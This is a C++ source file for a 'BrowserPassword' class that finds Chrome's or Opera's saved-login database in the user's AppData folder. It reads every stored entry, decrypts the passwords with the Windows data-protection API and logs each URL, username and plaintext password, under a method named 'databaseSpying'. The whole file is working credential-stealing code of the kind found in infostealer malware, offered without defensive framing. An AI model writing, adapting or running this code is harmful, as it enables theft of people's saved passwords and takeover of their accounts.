
#include "BrowserPassword.hh"

BrowserPassword::BrowserPassword()
{
	_ready = false;
}

BrowserPassword::~BrowserPassword() = default;

void BrowserPassword::setBrowserType(const BrowserType &type)
{
	switch (type)
	{
	case (BrowserType::CHROME):
		initChromeBrowser();
		break;
	case (BrowserType::OPERA):
		initOperaBrowser();
		break;
	}
}

void BrowserPassword::initChromeBrowser()
{
	_dbFilePath = C_DBFILE;
	_regKeyPath = C_REGKEY;
	_folder = CSIDL_LOCAL_APPDATA;
	_ready = true;
}

void BrowserPassword::initOperaBrowser()
{
	_dbFilePath = O_DBFILE;
	_regKeyPath = O_REGKEY;
	_folder = CSIDL_APPDATA;
	_ready = true;
}

bool BrowserPassword::isBrowserInstalled() 
{ 
	HKEY hkey = NULL;

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, _regKeyPath, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
	{ 
		Log::logSomething("[KO] Browser is not installed"); 
		return (false);
    }
	Log::logSomething("[OK] Browser is installed");
	RegCloseKey(hkey); // close the key with handle pointer
	return (true);
}

bool BrowserPassword::findAppdataPath(std::string &appdataPath)
{ 
	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters

	if (SHGetFolderPathA(NULL, _folder, NULL, 0, path) != S_OK)
	{ 
		Log::logSomething("[KO] Error failed to find Appdata folder");
		return (false); 
	}
	Log::logSomething("[OK] Appdata folder found");
	appdataPath.append(path); // add path in our string
	return (true);
}

void BrowserPassword::findPasswordTable(sqlite3 *db)
{ 
	sqlite3_stmt *stmt;

	Log::logSomething("[OK] Database open");
	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, 0) == SQLITE_OK) 
	{
		Log::logSomething("[OK] Query successfully compiled");
		while (sqlite3_step(stmt) == SQLITE_ROW)  
			printPassword(stmt); /* decrypt and display infos */  
	} 
	else 
		Log::logSomething("[KO] Error compiling query");
	sqlite3_finalize(stmt); // finalize the compiled query
	sqlite3_close(db); // close database
}

const char *BrowserPassword::uncryptData(BYTE *password, int size)
{ 
	DATA_BLOB in; 
	DATA_BLOB out;

    in.pbData = password;
    in.cbData = size + 1; 
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
	{ 
		out.pbData[out.cbData] = 0; // set zero terminator '\0' 
		return ((const char*)out.pbData);
    } 
	return ("Error not found\n");
}

void BrowserPassword::printPassword(sqlite3_stmt *stmt)
{
	std::string infos = std::string("\nURL:\t" + std::string((const char *)sqlite3_column_text(stmt, 0))) +
						std::string("\nLogin:\t" + std::string((const char *)sqlite3_column_text(stmt, 1))) +
						std::string("\nPassword:\t" + std::string(uncryptData((BYTE *)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))));

	Log::logSomething(infos + '\n');
}

void BrowserPassword::databaseSpying()
{ 
	sqlite3 *db; 
	std::string dbPath; 

	if (!_ready)
		Log::logSomething("[KO] Browser path are not initialized");
	else if (isBrowserInstalled()) // is browser installed on this computer ?
	{
		if (findAppdataPath(dbPath)) // where is it's appdata folder
		{ 
			dbPath += _dbFilePath; // appdata folder path + database file path
			if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK)
				findPasswordTable(db); /* find password table on database */
			else
				Log::logSomething("[KO] Error opening database");
		} 
	}
}